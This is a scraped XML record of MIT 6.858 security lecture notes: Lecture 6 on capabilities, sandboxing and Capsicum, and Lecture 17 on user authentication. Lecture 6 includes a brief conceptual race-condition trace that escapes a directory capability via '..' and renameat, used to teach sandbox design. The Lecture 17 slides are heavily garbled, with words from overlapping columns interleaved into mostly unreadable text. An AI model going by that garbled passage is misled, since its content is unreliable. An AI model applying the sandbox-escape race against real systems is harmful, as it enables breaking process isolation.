    <lecture>
      <lecture_title>Capabilities (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec6/</lecture_pdf_url>
      <lectureno>6</lectureno>
      <slides>
        <slide>
          <slideno>6</slideno>
          <text>Hard	&#13; to	&#13; control sandbox's	&#13; access to objects in global  namespaces.
Kernel	&#13; changes.
Just to	&#13; double -check:	&#13; w
hy	&#13; do we	&#13; need kernel changes?
oCan	&#13; we
implement everything in a library (and LD_PRELOAD it)?
Represent more things as file descriptors: processes (pdfork).
oGood idea
in general.
Capability	&#13; mode: once process enters cap
mode, cannot leave (+all children).
In
capability mode, can only use file descriptors -- no global namespaces.
oCannot	&#13; open files by full path name: no need for chroot as in OKWS.
oCan	&#13; still open files by relative path name,	&#13; given fd for dir (openat).
Cannot	&#13; use ".." in path names or in symlinks:
why not?
oIn principle, ".." might be fine, as long as ".." doesn't go too far.
oHard	&#13; to	&#13; enforce	&#13; correctly.
oHypothetical design:
Prohibit looking	&#13; up ".." at the	&#13; root
capability.
Nomore ".." than non-".." components in path name, ignoring ".".
Assume a process has capability C1	&#13; for /foo.
Race condition,
in a single process	&#13; with 2 threads:
T1: mkdir(C1, "a/b/c")
T1: C2 = openat(C1, "a")
T1: C3 = openat(C2, "b/c/../..") ## should return a cap
for /foo/a
Let openat() run until it's about to look up the first ".."
T2: renameat(C1, "a/b/c", C1, "d")
T1: Look up the first "..", which goes to "/foo"
Look up the second "..", which goes to "/" 
 
Do Unix
permissions still apply?
oYes --can't access all files	&#13; in dir just because	&#13; you have a cap for dir.
oBut intent is that sandbox shouldn't rely on
Unix permissions.
For file	&#13; descriptors, add	&#13; a
wrapper	&#13; object that stores	&#13; allowed	&#13; operations.
Where does the kernel	&#13; check	&#13; capabilities?
oOne	&#13; function in kernel looks up fd numbers -- modified it to check caps.
oAlso modified namei function, which looks up path names.
oGood practice: look for narrow interfaces, otherwise easy to miss checks.
libcapsicum.
Why do application	&#13; d
evelopers need this library?
Biggest	&#13; functio
nality: starting	&#13; a new	&#13; process in	&#13; a sandbox.
fd lists.
Mostly a conv
enient	&#13; way to pass lots of file descriptors to child process.
Name file descriptors by string instead of hard-coding	&#13; an fd number.
cap_enter()	&#13; vs lch_start().
What	&#13; are th
e advantages of sandboxing	&#13; using	&#13; exec	&#13; instead of cap_enter?
Leftover data in memory: e.g., private keys in OpenSSL/OpenSSH.
7</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>1. Ambient authority: privileges that are automatically used by process are the 
problem here. No privileges should ever be used automatically. Name of an 
object should	&#13; be	&#13; also	&#13; the	&#13; privileges	&#13; for accessing	&#13; it. 
2. Complex	&#13; permission checks: hard for privileged app to replicate. With simplerchecks, privileged apps might be able to
correctly check if another	&#13; user should 
have access to some object. 
What are examples of ambient authority?
	 Unix UIDs, GIDs. 
	 Firewalls	&#13; (IP	&#13; address	&#13; vs. privileges	&#13; for accessing it) 
	 HTTP cookies (e.g. going to a URL like http://gmail.com ) 
How	&#13; does naming an object through a capability help?
	 Pass file descriptor instead of passing a file name. 
	 No way	&#13; to	&#13; pass	&#13; a valid	&#13; FD unless	&#13;  caller	&#13; was	&#13; authorized	&#13; to	&#13; open t hat file. 
Could	&#13; we use file descriptors to solve our problem with a setuid gcc?
	 Sort-of:	&#13; could make the compiler only accept files via FD passing. 
	 Or,	&#13; could create a setuid helper that	&#13; opens the /etc/gcc.stats file, passes a n	&#13; open
file descriptor back to
our compiler process. 
	 Then, can continue using this open file much like any other file. 
	 How to	&#13; ensure	&#13; only	&#13; gcc	&#13; can run this	&#13; helper? 
o	 Make gcc setgid to some special group. 
o	 Make the he
lper only executable to that	&#13; special	&#13; group. 
o	 Make sure th
at	&#13; group	&#13; has no other privileges given	&#13; to it. 
What problem are the Capsicum	&#13; authors
trying to solve with capabilities?
	 Reducing privileges	&#13; of untrustworthy	&#13; code in various	&#13; applications. 
	 Overall	&#13; plan: 
o	 Break up an application into smaller components. 
o	 Reduce privileges of components that
are most vulnerable to attack. 
o	 Carefully	&#13; design interfaces so one
component can't compromise another. 
	 Why is th
is difficult? 
o	 Hard	&#13; to reduce privileges of code ("sandbox") in traditional Unix system. 
o	 Hard	&#13; to give sandboxed code
some limited access (to files, network, etc). 
What sorts of applications might use
sandboxing?
	 OKWS. 
	 Programs that deal with network input: 
o	 Put input handling	&#13; code into	&#13; sandbox. 
	 Programs that manipulate data in
complex ways: 
o	 (gzip,	&#13; Chromium,	&#13; media codecs, browser plugins, ...) 
o	 Put complex (&amp; likely
buggy) part into sandbox. 
	 How	&#13; about arbitrary programs downloaded
from the Internet? 
o	 Slightly different problem: need to isolate unmodified application code. 
2</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>Disadvantage: hard to allow some sharing: no shared processes, pipes, files.
Disadvantage: virtualizing everything often makes VMs	&#13; relatively heavyweight.
oNon-trivial	&#13; CPU/memory	&#13; overheads for each sandbox.
Plan 1: Discretionary	&#13; Access Control	&#13; (DAC).
Each
object has a set of permissions (an access control list).
oE.g., Unix files,	&#13; Windows objects.
o"Discretionary"  means applications  set permissions  on objects (e.g.,
chmod).
Each program runs with privileges of some principals.
oE.g.,
Unix user/group	&#13; IDs,	&#13; Windows SIDs.
When program accesses an object, check the program's
privileges to decide.
o"Ambient privilege": privileges used implicitly for each access.
Name Process privileges
| |

V V
Object -&gt; Permissions -&gt; Allow?
 
H
ow	&#13; would you sandbox a program on a DAC system (e.g., Unix)?
Must	&#13; allocate a new	&#13; principal	&#13; (user ID):
oOtherwise,	&#13;  existing principal's privileges will be used implicitly!
Prevent process
from reading/writing other files:
oChange	&#13; permissions on every file system-wide?
Cumbersome,	&#13; impractical, requires root.
oEven then, new program
can create important world-writable file .
oAlternative: chroot (again, have to be root).
Allow process to
read/write a certain file:
oSet permissions on that file appropriately, if possible.
oLink/move file into the chroot directory for the sandbox?
Prevent
process from accessing the network:
oNo re al	&#13; answer for thi s in	&#13; Unix.
oMaybe configure firewall?	&#13;  But not	&#13; really process -specific.
Allow process to access particular network
connection:
oSee above, no great	&#13; plan for this in Unix.
Control what processes	&#13; 
a sandbox can kill / debug / etc:
oCan run under the same UID, but that may be too many privileges.
oThat UID might also have other privileges ...
Problem: only root can create new principals, on most DAC systems.
E.g., Unix, Windows.
Problem: some objects might
not have a clear configurable
access contr ol list.
Unix:	&#13; processes, network
Problem: permissions on files might not map to policy
you want for sandbox.
Can sort-of	&#13; work around	&#13; using chroot for files,	&#13; but awkward.
4</text>
        </slide>
        <slide>
          <slideno>10</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>oOne option: programmer  writes	&#13; their	&#13; application	&#13; to	&#13; run inside sandbox.
Works in some cases: Javascript, Java, Native C
lient,	&#13; ...
Need to standardize on an environment for sandboxed code.
oAnother option: impose new security policy on existing code.
Probably
need to preserve all APIs that programmer was using.
Need to impose checks on existing APIs, in that case.
Unclear	&#13; what the	&#13; policy	&#13; should	&#13; be	&#13; for accessing files,	&#13; network,	&#13; etc.
Applications that want to avoid being tricked into misusing privileges?
oSuppose two Unix users, Alice and Bob, are working on some project.
oBoth are in some group G, and project dir allows access by that group.
oLet's say Alice emails someone a file from the project directory.
oRisk: Bob could replace the file with a symlink to Alice's private file.
oAlice's process will implicitly use Alice's ambient privileges to open.
oCan think of this	&#13; as	&#13; sandboxing an individual file	&#13; operation.
What sandboxing plans (mechanisms) are out there (advantages,
limitations)?
OS typically provides some kind of security mechanism ("primitive").
oE.g., user/group	&#13; IDs in Unix, as we saw	&#13; in the previous lecture.
oFor today, we	&#13; will look at OS -level	&#13; security primitives/mechanisms.
oOften a good match when you care
about protecting resources the OS
manages.
oE.g., files,	&#13; processes,	&#13; coarse-grained	&#13; memory, network interfaces, etc.
Many OS-level	&#13; sandboxing mechanisms work at the level
of processes.
oWorks well	&#13; for an entire process that	&#13; can	&#13; be isolated as a unit.
oCan require	&#13; re-architecting	&#13; application	&#13; to create processes for isolation.
Other techniques	&#13; can provide finer -
grained	&#13; isolation (e.g., threads	&#13; in proc).
oLanguage -level	&#13; isolati on	&#13; (e.g.,	&#13; Javascript).
oBinary instrumentation (e.g., Native Client).
oWhy would we need these other sandboxing	&#13; techniques?
Easier to control	&#13; access to non -
OS	&#13; / finer-grained	&#13; objects.
Or
perhaps can sandbox	&#13; in	&#13; an OS -independent way.
oOS-leve
l	&#13; isolation	&#13; often	&#13; used in	&#13; conjunction	&#13; with finer-grained	&#13; isolation.
Finer-grained	&#13; isolation is
often hard	&#13; to get right	&#13; (Javascript,	&#13; NaCl).
E.g., Native	&#13; Client	&#13; uses both a fine -grained	&#13; sandbox + O S-level	&#13; 
sandbox.
oWill look at these in more detail in later lectures.
Plan 0: Virtualize everything	&#13; (e.g., VMs).
Run untrustworthy code
inside of a virtualized environment.
Many examples: x86 qemu, FreeBSD jails, Linux LXC,	&#13; ..
Almost a different category of mechanism: strict isolation.
Advantage: sandboxed code inside VM	&#13; has almost no interactions with outside.
Advantage: can sandbox unmodified code that's not expecting to be isolated.
Advantage: some VMs	&#13; can be started by arbitrary users (e.g., qemu).
Advantage: usually composable with other isolation techniques, extra layer.
3</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 6
Capabilities and	&#13; other Protection Mechan
isms	&#13; 
What's the problem the authors of "confused deputy" encountered?
 Their system had a Fortran compiler, /sysx/fort (in Unix filename syntax)
 They wanted the Fortran compiler to record usage statistics,	&#13; bu t where?
o Created	&#13; a special statistics	&#13; file, /sysx/stat.
o Gave /sysx/fort "home files license" (kind-of	&#13; like	&#13; setuid	&#13; w.r.t.	&#13; /sysx)
 What	&#13; goes wr
ong?
o	 User can invoke the compiler asking it to write output to /sysx/stat.
e.g. /sysx/fort /my/code.f -o	&#13; /sysx/st
at
o Compiler	&#13; opens supplied path name, and succeeds, because of its license.
o User alone	&#13; couldn't have written	&#13; to	&#13; that /sysx/stat file.
 Why isn't the /sysx/fort thing
just a bug in the compiler?
o Could, in principle, solve	&#13; this	&#13; by	&#13; adding checks	&#13; all over the	&#13; place.
o Problem: need
to add checks virtually everywhere files are opened.
o Perfectly correct code becomes buggy once it's part of a setuid binary.
 So what's the "confused deputy"?
o	 The compiler is running on behalf of two principals:
the user pr
incipal (to	&#13; open user's files)
the compiler principal (to open compiler's files)
o Not clear what principal's privileges should be used at any given time.
Can	&#13; we solve this confused deputy
problem in Unix?
 Suppose gcc wants to keep statistics in /etc/gcc.stats
 Could	&#13; have a special setuid program that only writes to that file
o Not so convenient:	&#13; can't just open	&#13; the	&#13; file	&#13; like	&#13; any	&#13; other.
 What if we make gcc
setuid to some non-root user	&#13; (owner	&#13; of stats	&#13; file)?
o Hard	&#13; to	&#13; access	&#13; user's	&#13; original files.
 What	&#13; if gcc
is setu id-root? (Bad	&#13;  idea, but let's	&#13; figure	&#13; out why..)
o Lots	&#13; of potential for buffer	&#13; overflows	&#13; leading to	&#13; root access.
o Need to instrument every place where gcc might open a file.
 What check should we perform
when gcc is opening a file?
o If it's an "internal"	&#13; file	&#13; (e.g. /etc/gcc.stats), maybe no check.
o If it's a user-supplied	&#13; file, need to make sure user can access it.
o Can	&#13; look at the permissions for the file in question.
o Need to also check permissions on directories leading up to this file.
 Potential problem: race conditions.
o What if
the file changes between the time we check it and use it?
o Common	&#13; vulnerability: attacker replaces legit file with symlink
o Symlink could point to, say, /etc/gcc.stats, or /etc/passwd, or ...
o Known as "time-of-check	&#13; to time-of-use"	&#13; bugs (TOCTTOU).
Several possible ways of thinking of
this problem:
1</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>oPossible solution: helper program can run outside of capability mo de,
open TCP/UDP	&#13; sockets for sandboxed programs based on policy.
References:
http://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-
v1.0.pdf
http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=blob;f=Documentation/prctl/seccomp_filter.txt;hb=HEAD
http://en.wikipedia.org/wiki/Mandatory_Integrity_Control
10</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>o What are the various answers to the homework question? 
Does Capsicum	&#13; achieve its goals?
	 How hard/easy	&#13; is it to	&#13; use? 
o	 Using Capsicum	&#13; in an application almost always requires app changes. 
(Many applications tend to open files by
pathname, etc.)
One exception: Unix	&#13; pipeline apps (filters) that	&#13; just	&#13; operate on	&#13; 
FDs.
o	 Easier for streaming applications that process data via FDs. 
o	 Other sandbo
xing	&#13; req uires	&#13; similar changes (e.g., dhclient, Chromium). 
o
	 For existing applications, lazy initialization seems to be a problem. 
No general -purpose	&#13; solution	&#13; 
--either	&#13; change	&#13; code or initialize	&#13; 
early.
o	 Suggested plan: sandbox and see what breaks. 
 
Might	&#13; be subtle: gzi p	&#13; compression level bug.
	 What	&#13; are th
e security guarantees it	&#13; provides? 
o	 Guarantees	&#13; provided to	&#13; app	&#13; developers:	&#13; sandbox can	&#13; operate	&#13; only	&#13; on open FDs. 
o	 Implications depend on how
app developer partitions application, FDs. 
o	 User/admin doesn't get any direct guarantees from C apsicum. 
o	 Guarantees assume no bugs in FreeBSD kernel (lots of code), and that the 
Capsicum	&#13; developers caught all ways to access a resource not via FDs. 
	 What are the performance overheads? (CPU,	&#13; memory) 
o	 Minor overheads for accessing	&#13; a file des criptor.  
o	 Setting up a sandbox
using fork/exec takes O(1msec), non-trivial. 
o	 Privilege separation can require RPC /
message-pas sing,	&#13; perhaps 
noticeable. 
	 Adoption? 
o	 In FreeBSD's kernel	&#13; now, enabled by default	&#13; (as of FreeBSD 10). 
o	 A handful of applications have	&#13; been modified to use Capsicum:	&#13; dhclient, 
tcpdump, and a few more since the paper was written (R ef:
http://www.cl.cam.ac.uk/research/security/capsicum/freebsd.html ) 
o	 Casper	&#13; daemon to help applications perform non-capability	&#13; operations. 
 E.g., DNS lookups, look up entries in /etc/passwd, etc.
 http://people.freebsd.org/~pjd/pubs/Capsicum_and_Casper.pdf	&#13; 
o There's a port of Capsicum	&#13; to Linux (but not in upstream kernel repo). 
What applications wouldn't be a good fit for Capsicum?	&#13; 
	 Apps that need to control access to non-kernel -managed	&#13; objects.  
o	 E.g.: X server state,	&#13; DBus,	&#13; HTTP	&#13; origins in a web browser,	&#13; etc. 
o	 E.g.: a database server that needs
to ensure DB file is in correct format. 
o	 Capsicum	&#13; treats pipe to a user-
level	&#13; server (e.g.,	&#13; X server) as one cap. 
	 Apps that need to connect to
specific TCP/UDP	&#13; addresses/ports from sandbox. 
o Capsicum	&#13; works by only allowing operations on existing open FDs. 
o Need some other mechanism to control what FDs can be opened. 
9</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>o(Yet another	&#13; integer	&#13; value,	&#13; stored	&#13; in inode along	&#13; w/	&#13; uid, gid, ..)
Mac OS X sandbox ("Seatbelt") and Linux seccomp_filter.
Application specifies policy for whether to allow/deny each syscall.
o(Written	&#13; in LISP for MacOSX's mechanism, or in BPF for Linux's.)
Can	&#13; be difficult to determine
security impact of syscall based on args.
oWhat does a pathname refer to? Symlinks, hard	&#13; links,	&#13; race
conditions (Although MacOSX's sandbox provides a bit
more
information.)
Advantage:	&#13; any	&#13; user	&#13; can	&#13; sandbox an	&#13; arbitrary	&#13; piece	&#13; of code, finally!
Limitation: programmer must separately write the policy + application code.
Limitation: some operations can only be filtered at coarse granularity.
oE.g., POSIX shm in MacOSX's filter language, according to Capsicum
paper.
Limitation: policy language might be awkware to use, stateless, etc.
oE.g.,
what if app should have exactly one connection to some server?
Note:  seccomp_filter  is quite different  from  regular/old seccomp, and the 
Capsicum	&#13; paper talks  about  the regular/old seccomp. ]
Is it a good idea to separate policy from application code?
Depends	&#13; on overall goal.
Potentially
good if user/admin wants to look at or change policy.
Problematic if app developer needs to maintain both code and policy.
For app developers, might help clarify policy.
Less-centralized	&#13; "MAC"	&#13; systems  (Seatbelt,  seccomp)  provide  a compromise .
Plan 3: Capabilities  (Capsicum) .
Different plan for a
ccess	&#13; control:	&#13; capabilities.
If process has a handle for some object ("capability"),	&#13; can access
it.
Capability --&gt; Object
No separate	&#13; question	&#13; of privileges,	&#13; access	&#13; control lists,	&#13; policies,	&#13; etc.
E.g.: file	&#13; descriptors on Unix are	&#13; a capability for a file.
oProgram can't make up a file descriptor it didn't legitimately get. (Why
not?)
oOnce
file is open, can access it; checks happened at open time.
oCan pass	&#13; open files	&#13; to	&#13; other	&#13; processes.
oFDs also help solve "time-of-check to	&#13; time-of-use"	&#13; (TOCTTOU)	&#13; bugs.
Capabilities	&#13; are usually ephemeral: not part of on-disk inode.
oWhate
ver s tarts	&#13; the program needs to re-create	&#13; capabilities each time.
Global namespaces.
Why are these
guys so fascinated with eliminating global namespaces?
Global namespaces require some access control story (e.g., ambient privs).
6</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>Related problem: performing some operations with a subset of privileges.Recall example with Alice emailing a file out of shared
 group directory.
"Confused	&#13; deputy problem": program is a "deputy" for multiple principals.
One solution: check if group permissions allow access (manual, error-prone).
oAlternative solution: explicitly specify	&#13; privileges	&#13; for each operation.
C
apabilities	&#13; can help: capability (e.g., fd) combines object +
privileges.
 Some Unix features  incompat.  w/ pure capability  design  (symlinks
by name) .
Plan 2: Mandatory	&#13; Access Control	&#13; (MAC).
In DAC,	&#13; security
policy is set by applications themselves (chmod, etc).
MAC tries to help users / administrators specify policies for applications.
o"Mandatory"	&#13; in the sense that applications can't change this policy.
oTraditional MAC systems try to enforce military classified levels.
oE.g.
,	&#13; ensure	&#13; top-secret	&#13; programs can't reveal classified information.
Name Operation + caller process

| |
V V
 Object --------&gt; Allow?
^ 
|
Policy ------------+ 
Note: many systems have aspects of both DAC + MAC in them.
oE.g., Unix user IDs are "DAC",	&#13; but one can argue firewalls are "MAC".
oDoesn't really matter -- good to know the extreme points in design space
Windows Mandatory
Integrity Control	&#13; (MIC)	&#13; / LOMAC in FreeBSD.
Keeps track	&#13; of an "integrity level"	&#13; for each process.
Files have a minimum integrity level associated with them.
Process cannot write	&#13; to	&#13; files	&#13; above	&#13; its	&#13; integrity	&#13; level.
IE in Windows Vista	&#13; runs as low integrity,	&#13; cannot overwrite	&#13; system files.
FreeBSD LOMAC also tracks data read by processes.
o(Similar to many information-flow -based	&#13; systems.)
oWhen	&#13; pro
cess reads low -integrity	&#13; data, it becomes low integrity too.
oTransitive, prevents adversary
from indirectly tampering with files.
Not
immediately useful for sandboxing: only a fixed number of levels.
SElinux.
Idea: system administrator specifies a system-wide security policy.
Policy	&#13; file	&#13; specifies whether	&#13; each operation	&#13; should	&#13; be	&#13; allowed	&#13; or denied.
To help	&#13; decide whether	&#13; to	&#13; allo w/deny,	&#13; files labele d with "types".
5</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>Leftover	&#13; file	&#13; descriptors	&#13; that application forgot to	&#13; close. 
	 Figure 7 in paper: tcpdump had privileges on stdin, stdout, stderr. 
	 Figure	&#13; 10 in paper:	&#13; dhclient had	&#13; a raw socket, syslogd	&#13; pipe, lease	&#13; file. 
Advantages: any process can create a new sandbox.
 (Even a sandbox can	&#13; create	&#13; a sandbox.)
 
Advantages: fine-grained control of access to resources
(if they map to FDs).
 Files, networ k	&#13; sockets,	&#13; pro cesses.
 
Disadvantage:	&#13; weak story	&#13; for keeping track of access	&#13; to	&#13; persistent files.
Disadvantage: prohibits global namespaces, requires writing code differently.
Alternative capability designs: pure capability-based OS (KeyKOS,	&#13; etc).
	 Kernel	&#13; only	&#13; provides a message-passing	&#13; service. 
	 Message-passing	&#13; channels (very much like file descriptors) are capabilities. 
	 Every	&#13; application has to be written	&#13; in a capability style. 
	 Capsicum	&#13; claims to be more pragmatic: some applications need not be changed. 
Linux	&#13; capabilities: solving a different problem.
	 Trying t
o	&#13; partition	&#13; root's	&#13; privileges	&#13; into	&#13; finer-grained	&#13; privileges. 
	 Represented by various capabilities: CAP_KILL,	&#13; CAP_SETUID, 
CAP_SYS_CHROOT 
	 Process can
run with	&#13; a specific capability	&#13; instead	&#13; of all of root's	&#13; privs. 
	 Ref: capabilities(7), http://linux.die.net/man/7/capabilities 
Using Capsicum	&#13; in applications.
	 Plan: ensure sandboxed process doesn't use path names or other global NSes. 
o For every directory it might need access to, open FD ahead of time. 
o To open files, use openat() starting from one of these directory FDs. 
o .. programs that open lots of files all over the place may be cumbersome. 
	 tcpdump. 
o	 2-line
version: just	&#13; cap_enter() after opening	&#13; all FDs. 
o	 Used procstat t
o	&#13; look at resulting	&#13; capabilities. 
o	 8-line ve
rsion: also restrict	&#13; stdin/stdout/stderr. 
o	 Why?	&#13;  E.g.,
avoid reading	&#13; stderr log ,	&#13; changing terminal settings 
	 dhclient
. 
o	 Already privilege-separated, using Capsicum	&#13; to reinforce sandbox (2
lines). 
	 gzip. 
o Fork/exec	&#13; sandboxed	&#13; child	&#13; process, feed it data using RPC	&#13; over pipes. 
o Non-trivial	&#13; changes, mostly to marshal/unmarshal data for RPC:	&#13; 409 LoC. 
o Interesting bug: forgot to propagate compression level at first. 
	 Chromium. 
o	 Already privilege-separate d	&#13; on other platforms (but not on FreeBSD). 
o	 ~100 LoC to wrap	&#13; file descriptors for sandboxed processes. 
	 OKWS. 
8</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-4-privilege-separation/</video_url>
          <video_title>Lecture 4: Privilege Separation</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>User Authentication (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec17/</lecture_pdf_url>
      <lectureno>17</lectureno>
      <slides>
        <slide>
          <slideno>4</slideno>
          <text>o Ser
withver
	&#13; te-
xtCo
-basmp
ea
dti
	&#13; b
pasle:	&#13; 
s"
worAt	&#13; th
de
s	&#13; 
.	&#13; Prver
ovidifier
er's	&#13; 
se
	&#13; dnd
on't	&#13; have	&#13; to	&#13; change,	&#13; the	&#13; scheme	&#13; is	&#13; comp
o existing	&#13; authent	&#13; tha
et
ii
rb
	&#13; le	&#13; 
suBr
po
pws
orter
	&#13; t-
heCo
	&#13; mp
schaica
tibt
leion	&#13; set
:	&#13; "Useup	&#13; t
rs	&#13; do
o	&#13; 
ns
'u
t	&#13; p
hp
aort	&#13; the	&#13; scheme."	&#13; 
require	&#13; the	&#13; instae
lme
lat	&#13; 
ion	&#13; of	&#13; pl.	&#13; .	&#13; .	&#13; scheme
ugins	&#13; or	&#13; as	&#13; fail	&#13; tov
ny	&#13; k	&#13; e
p	&#13; 
rto
o	&#13; c
vih
dange
e	&#13; this	&#13; th
	&#13; beei
ner	&#13; c
fli
it	&#13; ient	&#13; to
f	&#13; the	&#13; 
y	&#13; 
o inst
Accessiballation	&#13; requires 	&#13; ind	&#13; of 	&#13; software	&#13; whose	&#13; 
using	&#13; thel
	&#13; e:	&#13; "Users	&#13; w
scheme	&#13; by	&#13; dho	&#13; caadmi
n	&#13; use	&#13; panistrativ
isabilities	&#13; orsswe	&#13; privileges."	&#13; 
	&#13; othords
er	&#13; ph	&#13; a
yr
se
i	&#13; 
cn
al	&#13; (ot	&#13; p
conditnore
ions."	&#13; tv
	&#13; cognitented
ive)	&#13; 	&#13; from	&#13; 
	&#13; 
o 
o D
toe
	&#13; up
plo
dy
aa
tb
ei
	&#13; eli
nty
	&#13; ma	&#13; is	&#13; e
ssx
etr
!	&#13; emely	&#13; difficult:	&#13; it's	&#13; difficult	&#13; to	&#13; get	&#13; users	&#13; or	&#13; servers	&#13; 
Passw
"deployability"	&#13; as	&#13; how	&#13; well	&#13; a	&#13; systemords	&#13; do	&#13; well 	&#13; in	&#13; this	&#13; category	&#13; by
	&#13; int	&#13; defa
egraul
tt,	&#13; since	&#13; the	&#13; authors	&#13; define 	&#13; 
thpas
e	&#13; neswor
xt	&#13; d
cat	&#13; infra
egorystruct
	&#13; ure.	&#13; However,	&#13; passwordses	&#13; w
	&#13; don'tith	&#13; current
	&#13; do	&#13; very	&#13; 	&#13; 
well	&#13; in	&#13; 
	&#13; 
 Security:	&#13; What	&#13; kinds	&#13; of	&#13; attacks	&#13; can	&#13; the
o Resilient
user	&#13; after-to
	&#13; ob-Physical
e n-	&#13; auth
s rvi g	&#13; tO
heb
m	&#13; se
arv
ua
thtienti
	&#13; "Ancati
eo
nn
t:
icate	&#13; ato
tan
c	&#13; s
kc
eh
re
	&#13; cme
ann	&#13; p
or
te
	&#13; iv
mpent
e?
r	&#13; 
sonate	&#13; a	&#13; 
brQuas
okei-
n	&#13; oResilient
nly	&#13; by	&#13; r-to
epe-Physical -Observation	&#13; o
	&#13; in
fe
	&#13; t	&#13; 
ho
er
	&#13; 	&#13; 
smo
chr
ee
me	&#13; time
	&#13; cous.
l	&#13; 
dW
	&#13; bee	&#13; g
	&#13; rant	&#13; 
recordintime
s
 .	&#13; At
gta
	&#13; kc
eystks	&#13; in
rokcludati
e	&#13; sng	&#13; th
houle
d	&#13; o
erbs
	&#13; suer
rvation 	&#13; more	&#13; than,	&#13; say,	&#13; 10--20	&#13; 
Passwords	&#13; faile	&#13; sou
	&#13; this	&#13; tnds,
est	&#13; or
,	&#13; since,	&#13; therfi
mang,
l	&#13; 
	&#13; f
ii
malming	&#13; the	&#13; keybo
	&#13; e.g.,	&#13; they	&#13; caging	&#13; 
n	&#13; bof	&#13; k
e	&#13; caeyp
ptadar
."d
	&#13; ,	&#13; 
o filming	&#13; the	&#13; keyboard	&#13; or	&#13; recordingured	&#13; by 	&#13; 
acquaiResilient
ntance-to-Ta
	&#13; (orrget
	&#13; sked
ill-
eI
dmp
	&#13; ine
vr
es
so
tn
iga
at
ti
oo
rn
):
	&#13; 	&#13; 
t"
oIt
	&#13; i	&#13; 	&#13; 
is	&#13; notkeystr
	&#13; possiboke	&#13; sou
le	&#13; for	&#13; ands.	&#13; 
mpn	&#13; 
by
rel	&#13; e
atxplo
ives	&#13; iti
etng	&#13; kno
c.).	&#13; Personwled
age
l	&#13; k	&#13; o
nf
ow	&#13; pe
lr
edgson
ea
	&#13; questl	&#13; deta
ions	&#13; arils	&#13; (e
br
is
ro
thn
	&#13; a
dt
ae
t	&#13; 
ea
,	&#13; 
	&#13; sp
naecific	&#13; 
mes	&#13; ou
fser	&#13; 
	&#13; 
sche
me
 The	&#13; a	&#13; that	&#13; 
utfail
hors	&#13; sas	&#13; on	&#13; this	&#13; 
y	&#13; thapoint
t	&#13; pa."
ocoulssw	&#13; e	&#13; the	&#13; canonical	&#13; 
ords 	&#13; 
thar
at	&#13; ye	&#13; "quas
our	&#13; fi-
 acquaidn't
ntance	&#13; find	&#13; any	&#13; st
s	&#13; can	&#13; easiludies	&#13; saying
y	&#13; guess	&#13; your	&#13; passw	&#13;  rresist
iendsa
	&#13; on
rt
	&#13; "	&#13; b/c	&#13; they 	&#13; 
isResilient
	&#13; constrained	&#13; b-to-Throt
y	&#13; ttord.	&#13; 
significant	&#13; fractionhe	&#13; verifier	&#13; cannotled-Guessing:	&#13; "An
	&#13; 	&#13; 
suattacke
ccessfur	&#13; whose	&#13; rate	&#13; of	&#13; guessing	&#13; 
schemes	&#13; in	&#13; w	&#13; of	&#13; users	&#13; Lack	&#13; of	&#13; this	&#13; benel
fl
iy	&#13; 
t	&#13; igu
s	&#13; meess	&#13; 
at
nhe	&#13; 
t	&#13; tosecret
	&#13; penalizs	&#13; of	&#13; 
e	&#13; a	&#13; 
from	&#13; 
 a	&#13; 
Passwsmall	&#13; andhich
	&#13; we	&#13; it	&#13; i
lls
-	&#13; 
knofreq
wn	&#13; suent
ords	&#13; failubs	&#13; for	&#13; 
eu
	&#13; because	&#13; they 	&#13; t."ser
	&#13; -chosen	&#13; secrets	&#13; to	&#13; be	&#13; selected 	&#13; 
o distributions.	&#13; have	&#13; low	&#13; entropy	&#13; +	&#13; skewed 	&#13; 
Resilient
guessing	&#13; is-to
	&#13; c-Unt
onshrot
traint
eled
d	&#13; o-G
nu
lye
	&#13; bss
yi
	&#13; n
ag
v:	&#13; "An	&#13; attacker	&#13; whose	&#13; rate	&#13; of	&#13; 
misuccessfu
ght	&#13; for	&#13; l
ely	&#13; guess	&#13; the 	&#13; secrets	&#13; of	&#13; a	&#13; a
significailable	&#13; co
ntmputing	&#13; resources	&#13; cannot	&#13; 
xample	&#13; grant	&#13; this	&#13; benefit	&#13; if	&#13; an	&#13; attacke	&#13; fract
r	&#13; capableion	&#13; of	&#13; users.
	&#13; of	&#13; 	&#13; We	&#13; 
5</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>catSo,	&#13; final	&#13; scor
ee	&#13; is	&#13; 8	&#13; vs	&#13; 6.5.	&#13; Of	&#13;  course,	&#13; one	&#13; could	&#13; assign	&#13; non -unity	&#13; weights	&#13; to	&#13;  ea
passgor
wory,	&#13; but	&#13; the	&#13; point	&#13; is	&#13; that	&#13; it's	&#13; 
ds!	&#13; not	&#13; obvious	&#13; that	&#13; biometrics	&#13; are	&#13; "better"	&#13; than	&#13; ch	&#13; 
	&#13; 
Some	&#13; sets	&#13; of	&#13; goals	&#13; seem	&#13; difficult	&#13; to	&#13; achieve
 
 MemorywiseMemorywise --
EfEf
ff
oror
tlestles
ss
	&#13; +	&#13; +
	&#13; Res	&#13; Nothing
ilient-
-to
to-
Either	&#13; the	&#13; user	&#13; remembers	&#13; something,	&#13; or-Ca	&#13; 
rry.at	&#13; the	&#13; same	&#13; time.
	&#13; 	&#13; 
